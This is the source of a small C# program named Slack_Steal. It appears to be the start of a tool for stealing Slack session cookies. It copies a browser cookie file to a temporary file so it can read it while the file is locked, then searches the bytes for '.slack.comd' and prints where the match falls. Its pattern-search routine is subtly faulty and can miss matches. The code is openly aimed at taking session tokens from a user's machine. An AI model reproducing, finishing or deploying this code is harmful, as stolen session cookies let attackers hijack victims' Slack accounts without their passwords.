using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;


namespace Slack_Steal {
	class Program {

		public static int IndexOf(byte[] array, byte[] pattern, int offset) {
			int success = 0;
			for (int i = offset; i < array.Length; i++) {
				if (array[i] == pattern[success]) {
					success++;
				}
				else {
					success = 0;
				}

				if (pattern.Length == success) {
					return i - pattern.Length + 1;
				}
			}
			return -1;
		}


		static void Main(string[] args) {
			if (args.Length < 1) {
				Console.WriteLine("Executable requries agurments.\n \t Usage: Slack_steal.exe <Path to cookie file>");
				System.Environment.Exit(0);
			}


			//check of cookies files exists and load it
			byte[] cookies = new byte[] { };
			Console.WriteLine("Reading Cookie File");
			if (File.Exists(args[0])) {
				File.Copy(args[0], "a");
				cookies = File.ReadAllBytes("a");
				File.Delete("a");
			}
			else {
				Console.WriteLine("Unable to find the cookies file.");
				System.Environment.Exit(0);
			}

			//read data from cookies file

			var offset = IndexOf(cookies, Encoding.ASCII.GetBytes(".slack.comd"), 0);
			Console.WriteLine(offset);
		}
	}
}
